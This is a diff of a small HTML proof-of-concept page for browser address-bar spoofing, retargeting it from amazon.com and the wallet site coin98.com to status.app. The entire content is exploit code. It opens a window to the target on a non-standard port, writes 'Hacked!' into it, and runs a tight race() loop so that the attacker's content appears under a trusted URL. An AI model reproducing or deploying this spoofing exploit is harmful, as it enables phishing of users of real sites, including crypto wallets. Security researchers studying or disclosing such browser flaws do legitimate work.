@@ -3,7 +3,7 @@
 </head>
 
 <body>
-    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
+    <a href="javascript:window.open('https://status.app/','x');" onclick="startSpoof()">Spoof</a>
 </body>
     
     <script>
@@ -15,13 +15,13 @@
         windowSpoof.location.href !== 'about:blank';
       }
       catch (e) {
-        windowSpoof.location.href='https://coin98.com/';
+        windowSpoof.location.href='https://status.app/';
       }
     }
     
     function startSpoof() {
 
-      windowSpoof = window.open("https://coin98.com:83","x");
+      windowSpoof = window.open("https://status.app:83","x");
       windowSpoof.document.write('<h1 style="color:red">Hacked!<h1>');
 
       setInterval('race()', 0);
